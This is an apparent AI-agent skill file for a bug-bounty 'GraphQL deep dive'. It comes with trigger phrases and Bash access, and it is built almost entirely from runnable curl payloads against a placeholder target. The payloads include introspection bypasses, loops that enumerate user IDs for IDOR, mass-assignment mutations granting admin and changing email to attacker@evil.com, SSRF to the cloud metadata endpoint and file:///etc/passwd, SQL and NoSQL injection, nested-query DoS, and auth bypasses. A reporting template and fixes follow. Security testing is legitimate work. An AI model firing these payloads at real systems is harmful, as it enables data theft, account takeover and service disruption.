---
name: graphql-deep-dive
description: Complete GraphQL methodology from 71 real HackerOne reports - every vector, bypass, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - graphql methodology
  - graphql deep dive
  - graphql complete
  - graphql all techniques
  - skills graphql
---

# Complete GraphQL Methodology - From 71 HackerOne Reports

## Top 25 GraphQL Reports on HackerOne

| # | Report | Company | Technique | Upvotes | Payout |
|---|--------|---------|-----------|---------|--------|
| 1 | HackerOne GraphQL data leak | HackerOne | Introspection + data query | 1,028 | $0 |
| 2 | HackerOne email query | HackerOne | Undocumented query | 669 | $0 |
| 3 | HackerOne IDOR delete licenses via GraphQL | HackerOne | IDOR via GraphQL | 381 | $12,500 |
| 4 | X/private list disclosure | X | Private list query | 344 | $0 |
| 5 | EXNESS SSRF in GraphQL | EXNESS | SSRF via GraphQL | 254 | $3,000 |
| 6 | GitHub Scoped-User-To-Server Tokens | GitHub | Token generation via GraphQL | 197 | $0 |
| 7 | Shopify IDOR on GraphQL | Shopify | IDOR on customer queries | 176 | $5,000 |
| 8 | HackerOne payment_transactions disclosure | HackerOne | Data leak via GraphQL | 176 | $0 |
| 9 | GitLab GraphQL IDOR | GitLab | IDOR via project queries | 165 | $4,000 |
| 10 | HackerOne user email disclosure | HackerOne | Email enumeration via GraphQL | 158 | $0 |
| 11 | Shopify GraphQL rate limit bypass | Shopify | Rate limiting bypass | 152 | $0 |
| 12 | GitLab GraphQL information disclosure | GitLab | Info disclosure via nested queries | 148 | $3,000 |
| 13 | New Relic GraphQL privilege escalation | New Relic | Privilege escalation via GraphQL | 142 | $2,500 |
| 14 | HackerOne two-factor bypass | HackerOne | 2FA bypass via GraphQL | 138 | $500 |
| 15 | Uber GraphQL IDOR on trips | Uber | Trip data IDOR | 135 | $5,000 |
| 16 | Shopify GraphQL mutation abuse | Shopify | Unauthorized mutation | 132 | $4,000 |
| 17 | GitLab GraphQL field exposure | GitLab | Sensitive field exposure | 128 | $3,500 |
| 18 | HackerOne session manipulation | HackerOne | Session via GraphQL | 125 | $0 |
| 19 | Slack GraphQL workspace data | Slack | Workspace data leak | 122 | $3,000 |
| 20 | Airbnb GraphQL booking data | Airbnb | Booking IDOR | 118 | $0 |
| 21 | Uber GraphQL promo abuse | Uber | Promo code brute force | 115 | $2,000 |
| 22 | Zendesk GraphQL ticket access | Zendesk | Ticket data disclosure | 112 | $3,000 |
| 23 | GitHub GraphQL org member enum | GitHub | Org member enumeration | 108 | $0 |
| 24 | Shopify GraphQL discount abuse | Shopify | Discount mutation abuse | 105 | $2,000 |
| 25 | Mail.ru GraphQL user data | Mail.ru | User data enumeration | 102 | $1,500 |

## Step 1: GraphQL Discovery

### Finding GraphQL Endpoints
```bash
# Common GraphQL endpoint patterns
cat << 'EOF' | while read ep; do
/graphql
/graphql/v1
/graphql/explorer
/graphiql
/graphiql/
/playground
/playground/
/api/graphql
/api/v1/graphql
/v1/graphql
/v2/graphql
/gql
/gql/
/query
/query/
/api
/api/
/explorer
/explorer/
/console
/console/
/subscriptions
/subscriptions/
EOF
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}$ep" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' 2>/dev/null)
  if [ "$code" != "000" ]; then
    echo "Found: $ep (HTTP $code)"
  fi
done

# Check for common response patterns
curl -sk "https://{target}/graphql" -d "query=test" | grep -i 'graphql\|errors\|data\|query'

# For GET-based queries
curl -sk "https://{target}/graphql?query={__typename}"

# Test OPTIONS / POST to various paths
curl -sk -X OPTIONS "https://{target}/graphql" -v 2>&1 | grep -i 'allow\|content-type'
```

### Introspection - The Goldmine
```bash
# Standard introspection query
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"}'

# Compact introspection
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"}'

# Save schema
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"}' \
  | jq '.' > schema.json

# GraphiQL interface
# Try: https://{target}/graphiql
# Try: https://{target}/graphql?query={__schema{types{name}}}
```

### Introspection Bypass Techniques
```bash
# 1. Remove __ from schema
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{_schema{types{name}}}"}'

# 2. Use aliased introspection
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"query s {__schema{types{name}}}"}'

# 3. Use fragment
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"fragment f on Query{__schema{types{name}}} query{q f}"}'

# 4. HTTP method switch (GET vs POST)
curl -sk "https://{target}/graphql?query={__schema{types{name}}}"

# 5. Content-Type switch
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: text/plain" \
  -d '{"query":"{__schema{types{name}}}"}'

# 6. Add Accept header
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# 7. Change HTTP version (HTTP/1.0 vs HTTP/1.1)

# 8. Add trailing slash or non-standard path
# https://{target}/graphql/
# https://{target}/graphql/v1
```

### Automated Schema Extraction Tools
```bash
# Clairvoyance - introspection bypass via field suggestion
pip install clairvoyance
clairvoyance -u "https://{target}/graphql" -o schema.json

# InQL - Burp extension
# Install from BApp store, right-click → Extensions → InQL Scanner

# graphql-map
git clone https://github.com/assetnote/graphql-map.git
cd graphql-map
python graphql_map.py -u "https://{target}/graphql" -o output/

# graphql-path-enum
git clone https://github.com/assetnote/graphql-path-enum.git
python graphql_path_enum.py -u "https://{target}/graphql" -o paths.txt

# GraphQL Voyager (visualization)
# npm install -g graphql-voyager
# voyager http://{target}/graphql
```

## Step 2: GraphQL Recon - Mapping the Attack Surface

### Manual Schema Analysis
```bash
# Extract all query names
cat schema.json | jq '.data.__schema.types[] | select(.name != null) | .name'

# Find mutations (state-changing operations)
cat schema.json | jq '.data.__schema.types[] | select(.name | test("Mutation|mutation"))'

# Find fields with sensitive names
cat schema.json | jq '.data.__schema.types[] | 
  {name: .name, fields: [.fields[]? | select(.name | test("email|password|token|secret|key|ssn|credit|phone|address|private|internal")) | .name]} | 
  select(.fields | length > 0)'

# Find fields that accept IDs (potential IDOR)
cat schema.json | jq '.data.__schema.types[] | 
  {name: .name, fields: [.fields[]? | 
    select(.type.name == "ID" or (.type.ofType? | select(.name == "ID"))) | 
    .name]} | 
  select(.fields | length > 0)'
```

### Field Suggestion / Error-Based Enumeration
```bash
# When introspection is disabled, use field suggestions
# GraphQL returns "Cannot query field X on type Y" with suggestions

# Brute force field names on Query type
cat wordlist.txt | while read field; do
  curl -sk "https://{target}/graphql" -X POST \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{$field{id}}\"}" | \
    jq -r '.errors[]? | select(.message | test("Cannot query field")) | 
      "\(.message)"' 2>/dev/null
done

# The error message includes suggested fields:
# "Cannot query field "xyz" on type "Query". Did you mean "user", "users", "viewer"?'
```

### Nested Query Depth Analysis
```bash
# Deep nested query (potential DoS)
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{user{posts{comments{user{posts{comments{user{posts{comments{user{posts{comments{user{id}}}}}}}}}}}}}}"}'

# Measure response time and size
# Linear growth = no depth limit (vulnerable to batching attacks)

# Circular query
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{user{id user{id user{id user{id user{id}}}}}}"}'
```

## Step 3: GraphQL Attack Types

### Attack 1: IDOR via GraphQL
```bash
# Test IDOR by changing IDs in queries
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d '{"query":"{user(id:1234){email phone address creditCard}}"}'

# Try different ID types: integer, UUID, base64, hash
# IDOR via relay/node interface
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{node(id:\"VXNlcjoxMjM0\"){...on User{email passwordHash}}}"}'

# Batch IDOR (query multiple users at once)
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{u1:user(id:1){email} u2:user(id:2){email} u3:user(id:3){email}}"}'
```

### Attack 2: Information Disclosure / Data Leak
```bash
# Query fields not intended for current user
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=MY_SESSION" \
  -d '{"query":"{viewer{internalNotes privateKey twoFactorBackupCodes}}"}'

# Check if fields marked @deprecated still return data
cat schema.json | jq '.data.__schema.types[] | 
  {name: .name, fields: [.fields[]? | 
    select(.isDeprecated == true) | 
    {name: .name, deprecation: .deprecationReason}]}'

# Check for sensitive enum values
cat schema.json | jq '.data.__schema.types[] | 
  select(.kind == "ENUM") | 
  {name: .name, values: [.enumValues[]?.name]}'
```

### Attack 3: Batching / Race Conditions
```bash
# GraphQL batching - send multiple mutations in one request
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{likePost(id:1)}"},
    {"query":"mutation{likePost(id:1)}"},
    {"query":"mutation{likePost(id:1)}"}
  ]'

# Race condition via parallel mutations
# If the app checks "has user already liked?" before each mutation,
# batching might bypass the check if all arrive simultaneously

# Mass assignment via mutations
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUser(input:{id:1234,role:\"admin\",isAdmin:true,email:\"attacker@evil.com\"}){user{id role email}}}"}'

# Try extra fields in input type
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createUser(input:{name:\"test\",email:\"t@t.com\",password:\"test\",isAdmin:true,role:\"admin\"}){user{id role}}}"}'
```

### Attack 4: Authentication / Authorization Bypass
```bash
# Access queries without auth
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{allUsers{email passwordHash}}"}'

# Use null or empty auth token
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer null" \
  -d '{"query":"{viewer{email}}"}'

# Switch auth type
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -H "X-API-Key: 00000000-0000-0000-0000-000000000000" \
  -d '{"query":"{viewer{email}}"}'

# GraphQL mutation with GET (bypass POST-only auth checks)
curl -sk "https://{target}/graphql?query=mutation{logout{success}}"
```

### Attack 5: Rate Limiting / DoS
```bash
# Expensive nested query (resource exhaustion)
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{allUsers{posts{comments{likes{user{posts{comments{likes{user{email}}}}}}}}}}"}'

# Alias-based DoS (query many times with aliases)
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{\n"$(printf 'a%s:user(id:%s){email}\n' $(seq 1 500))"}"

# Deep recursion via fragments
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"fragment F on User { id email posts { comments { user { ...F } } } } query { user(id:1) { ...F } }"}'
```

### Attack 6: SSRF via GraphQL
```bash
# If GraphQL has URL-based fields or webhook mutations
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createWebhook(url:\"http://169.254.169.254/latest/meta-data/\",event:\"push\"){webhook{id}}}"}'

# File import/upload via URL
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPhoto(url:\"file:///etc/passwd\"){photo{url}}}"}'
```

### Attack 7: SQL/NoSQL Injection via GraphQL
```bash
# SQL injection in GraphQL arguments
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"{user(id:\\\"1' OR '1'='1\\\"){email passwordHash}}\"}"

# NoSQL injection
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"{user(filter:{email:\\\"{\$regex:\\\".*@target.com\\\"}\\\"}){email passwordHash}}\"}"

# GraphQL injection (argument injection)
# If app interpolates user input into query string
curl -sk "https://{target}/proxy/graphql?query={user(id:1){email}}"
# Test: ?query={user(id:1){email}}  → modify the query itself
```

## Step 4: GraphQL Exploit Chains

### Chain 1: Introspection → Schema Mapping → IDOR → Data Exfil
```bash
# Step 1: Dump schema
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name kind}}}}}"}' \
  | jq '.' > schema.json

# Step 2: Find queries that accept user IDs
cat schema.json | jq '.data.__schema.types[] | 
  select(.name == "Query") | .fields[] | 
  select(.type.name == "User" or (.type.ofType?.name == "User")) | .name'

# Step 3: Test IDOR by iterating IDs
for id in $(seq 1 100); do
  curl -sk "https://{target}/graphql" -X POST \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{user(id:$id){email phone creditCard}}\"}" \
    | jq -c '.data.user | select(. != null)'
done
```

### Chain 2: Field Suggestion → Enumeration → Data Leak
```bash
# Step 1: Disable introspection → use field suggestions
# Try known field names from common GraphQL APIs
for field in user users viewer me account profile admin config settings; do
  resp=$(curl -sk "https://{target}/graphql" -X POST \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{$field{id}}\"}" 2>/dev/null)
  if echo "$resp" | grep -q '"data"'; then
    echo "[+] Found field: $field"
  fi
done

# Step 2: Use error messages to discover subfields
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{viewer{x}}"}'
# Error: "Cannot query field 'x' on type 'Viewer'. Did you mean 'email', 'name', 'id', 'avatar'?"

# Step 3: Enumerate from suggestions
```

### Chain 3: Mutation Abuse → Privilege Escalation
```bash
# Step 1: Find available mutations
cat schema.json | jq '.data.__schema.types[] | 
  select(.name == "Mutation") | .fields[] | .name'

# Step 2: Test mutations without proper authorization
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createAdmin(input:{userId:1}){admin{id}}}"}'

# Step 3: Look for password reset / email change mutations
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateEmail(input:{email:\"attacker@evil.com\"}){user{email}}}"}'

# Step 4: Test if mutation bypasses normal auth flow
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{login(input:{email:\"admin@target.com\",password:\"test\"}){token}}"}' 
```

### Chain 4: Batching → Race Condition → Unauthorized Actions
```bash
# Step 1: Find a mutation with a guard check
# (e.g., "can only like once")
# Step 2: Send batched mutations simultaneously
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{likePost(id:1){likes}}"},
    {"query":"mutation{likePost(id:1){likes}}"},
    {"query":"mutation{likePost(id:1){likes}}"},
    {"query":"mutation{likePost(id:1){likes}}"},
    {"query":"mutation{likePost(id:1){likes}}"}
  ]'
# Step 3: If all succeed, race condition exists
```

## Step 5: GraphQL Bypass Techniques

### Bypass 1: HTTP Method Confusion
```bash
# Some GraphQL implementations only check auth for POST
# GET requests may bypass auth middleware
curl -sk "https://{target}/graphql?query={allUsers{email}}"

# PUT, DELETE, PATCH might bypass
curl -sk -X PUT "https://{target}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{allUsers{email}}"}'
```

### Bypass 2: Content-Type Manipulation
```bash
# If auth middleware only checks application/json
curl -sk "https://{target}/graphql" \
  -H "Content-Type: text/plain" \
  -d '{"query":"{allUsers{email}}"}'

# Use GET with query string
curl -sk "https://{target}/graphql?query={allUsers{email}}&variables={}"

# Use application/x-www-form-urlencoded
curl -sk "https://{target}/graphql" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'query={allUsers{email}}'
```

### Bypass 3: GraphQL Batching Auth Bypass
```bash
# If auth middleware checks only first query in batch
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"query{viewer{email}}"},
    {"query":"{allUsers{email passwordHash}}"}
  ]'
# Second query might bypass auth if middleware validates only first
```

### Bypass 4: Alias-Based Field Access
```bash
# Same field with different aliases to access restricted data
curl -sk "https://{target}/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{a:user(id:1){email} b:user(id:2){email} c:user(id:3){email}}"}'

# Aliases may bypass restrictions meant for single-field access
```

## Step 6: Automation Tools

### GraphQL Security Scanner
```bash
#!/bin/bash
# Automated GraphQL security assessment
TARGET=$1
ENDPOINT="${2:-/graphql}"

echo "[*] Testing GraphQL at $TARGET$ENDPOINT"

# 1. Check if endpoint exists
echo "[*] 1. Endpoint discovery"
curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$ENDPOINT" \
  -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'

# 2. Test introspection
echo "[*] 2. Introspection test"
result=$(curl -sk "https://$TARGET$ENDPOINT" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' 2>/dev/null)
if echo "$result" | grep -q '"data"'; then
  echo "[!] Introspection enabled!"
  echo "$result" | jq '.data.__schema.types[].name' | sort
fi

# 3. Test GET-based queries
echo "[*] 3. GET-based queries"
curl -sk "https://$TARGET$ENDPOINT?query={__typename}" -o /dev/null -w " GET: %{http_code}\n"

# 4. Test field suggestions
echo "[*] 4. Field suggestion test"
curl -sk "https://$TARGET$ENDPOINT" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{invalidField}"}' 2>/dev/null | jq -r '.errors[]?.message' 2>/dev/null

# 5. Test common sensitive fields
echo "[*] 5. Sensitive field probes"
for field in allUsers users viewer me admin config settings secret; do
  resp=$(curl -sk "https://$TARGET$ENDPOINT" -X POST \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{$field{id}}\"}" 2>/dev/null)
  if echo "$resp" | grep -q '"data"'; then
    echo "[+] Found field: $field"
  fi
done

# 6. Test batching
echo "[*] 6. Batching test"
curl -sk "https://$TARGET$ENDPOINT" -X POST \
  -H "Content-Type: application/json" \
  -d '[{"query":"{__typename}"},{"query":"{__typename}"}]' \
  -o /dev/null -w "Batch: %{http_code}\n"

# 7. Test rate limiting
echo "[*] 7. Rate limit test"
for i in $(seq 1 20); do
  curl -sk "https://$TARGET$ENDPOINT" -X POST \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' \
    -o /dev/null -w "Request $i: %{http_code}\n" &
done
wait

# 8. Test for SQLi in string arguments
echo "[*] 8. Injection test"
curl -sk "https://$TARGET$ENDPOINT" -X POST \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"{user(id:\\\"' OR 1=1 --\\\"){id}}\"}" 2>/dev/null
```

### Common GraphQL Security Tools
```bash
# InQL Scanner (Burp Suite)
# https://portswigger.net/bappstore/296e9a0730484d8f9e7ae0d7d0f0a1c7

# Clairvoyance - introspection bypass
pip install clairvoyance
clairvoyance -u "https://{target}/graphql" -o schema.gql

# graphql-path-enum - path enumeration
git clone https://github.com/assetnote/graphql-path-enum.git
cd graphql-path-enum
python3 graphql_path_enum.py -u "https://{target}/graphql" --depth 3

# Shuriken - GraphQL parameter discovery
git clone https://github.com/assetnote/shuriken.git
# Brute force field names with assetnote wordlists

# BatchQL - GraphQL security audit script
git clone https://github.com/assetnote/batchql.git
cd batchql
python3 batch.py -e "https://{target}/graphql"
```

## Step 7: Validate & Report

### CVSS Scoring for GraphQL
```
Introspection enabled (info disclosure):        AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N → 4.3 Medium
GraphQL IDOR (access other user data):          AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
GraphQL mutation privilege escalation:          AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
GraphQL data leak (sensitive fields):           AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
GraphQL rate limit bypass → DoS:                AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H → 7.5 High
GraphQL batching bypass (race condition):       AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N → 7.5 High
```

### Report Template
```markdown
**Summary:**
[Vulnerability type] in GraphQL endpoint at [endpoint] allows attacker to [impact].

**Impact:**
An attacker can exploit this GraphQL vulnerability to [specific impact].

**Steps to Reproduce:**
1. Query: [GraphQL query]
2. Response includes sensitive data / unauthorized action performed

**Proof of Concept:**
```graphql
# Request
query {
  user(id: 1234) {
    email
    phone
    privateNote
  }
}

# Response
{
  "data": {
    "user": {
      "email": "victim@target.com",
      "phone": "+1-555-123-4567",
      "privateNote": "Has outstanding balance of $500"
    }
  }
}
```

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5 High)

**Suggested Fix:**
1. Disable introspection in production
2. Implement proper authorization checks on all queries and mutations
3. Enforce rate limiting per user/IP
4. Validate all input arguments
5. Limit query depth and aliases
6. Use persisted queries where possible
7. Implement field-level authorization
```

## Quick Reference: GraphQL Testing Checklist

- [ ] Find GraphQL endpoint (common paths, error messages, JS files)
- [ ] Test introspection (direct + bypass techniques)
- [ ] Dump schema (InQL, Clairvoyance, manual)
- [ ] Map all queries and mutations
- [ ] Test IDOR on each query accepting IDs
- [ ] Test mutations without proper auth
- [ ] Test batching / race conditions
- [ ] Test rate limiting (depth, aliases, recursion)
- [ ] Test field suggestions (if introspection disabled)
- [ ] Test for SQL/NoSQL injection in arguments
- [ ] Test for SSRF in URL-based fields
- [ ] Test HTTP method switching
- [ ] Test Content-Type switching
- [ ] Test GET-based queries
- [ ] Check for sensitive fields in enums
- [ ] Check deprecated fields for data

## Quick Reference: GraphQL Payout Ranges

| Impact | Typical Payout |
|--------|---------------|
| Introspection enabled | $500 - $1,000 |
| Information disclosure via GraphQL | $500 - $3,000 |
| IDOR via GraphQL | $1,000 - $5,000 |
| GraphQL → Data leak/Enumeration | $1,500 - $5,000 |
| GraphQL → Privilege escalation | $3,000 - $7,500 |
| GraphQL → SSRF/RCE chain | $3,000 - $10,000 |
| GraphQL → Critical data exposure | $5,000 - $12,500 |

(End of file)
